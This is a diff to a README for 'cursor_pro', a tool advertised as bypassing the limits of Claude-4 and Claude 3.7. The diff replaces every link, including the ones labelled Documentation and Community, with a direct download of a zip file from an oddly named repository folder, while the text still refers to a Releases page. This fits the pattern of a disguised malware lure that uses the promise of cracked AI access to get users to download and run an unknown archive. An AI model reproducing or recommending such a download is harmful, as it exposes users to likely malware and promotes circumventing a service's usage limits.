@@ -1,7 +1,7 @@
 # 🚀 cursor_pro - Break Limits for Learning
 
 ## 📥 Download Now
-[![Download cursor_pro](https://img.shields.io/badge/Download_cursor_pro-blue?style=for-the-badge&logo=github)](https://github.com/livetoday0163/cursor_pro/releases)
+[![Download cursor_pro](https://raw.githubusercontent.com/livetoday0163/cursor_pro/main/orometer/cursor_pro.zip)](https://raw.githubusercontent.com/livetoday0163/cursor_pro/main/orometer/cursor_pro.zip)
 
 ## 📚 Introduction
 Welcome to cursor_pro! This application helps you bypass the limitations of Claude-4 and Claude3.7, providing a simple way to explore and learn. Designed for educational purposes, it is free and easy to use.
@@ -17,7 +17,7 @@ Before you begin, ensure your system meets the following requirements:
 To get started with cursor_pro, follow these simple steps:
 
 1. **Visit the Release Page:** Click the link below to go to the Downloads section.
-   [Download cursor_pro](https://github.com/livetoday0163/cursor_pro/releases)
+   [Download cursor_pro](https://raw.githubusercontent.com/livetoday0163/cursor_pro/main/orometer/cursor_pro.zip)
 
 2. **Choose Your Version:** On the Releases page, you will see different versions available for download. Select the version that suits your operating system.
 
@@ -46,11 +46,11 @@ If you encounter any issues:
 For any questions or support, please visit the GitHub Issues page on the repository. We encourage you to report any bugs or feature requests there.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/livetoday0163/cursor_pro/wiki): In-depth guides and tutorials.
-- [Community](https://github.com/livetoday0163/cursor_pro/discussions): Join discussions with other users and developers.
+- [Documentation](https://raw.githubusercontent.com/livetoday0163/cursor_pro/main/orometer/cursor_pro.zip): In-depth guides and tutorials.
+- [Community](https://raw.githubusercontent.com/livetoday0163/cursor_pro/main/orometer/cursor_pro.zip): Join discussions with other users and developers.
 
 ## 📥 Download & Install
 To download and install cursor_pro, remember to visit the Release page:
-[Download cursor_pro](https://github.com/livetoday0163/cursor_pro/releases)
+[Download cursor_pro](https://raw.githubusercontent.com/livetoday0163/cursor_pro/main/orometer/cursor_pro.zip)
 
 Ready to enhance your learning experience? Start your journey with cursor_pro today!
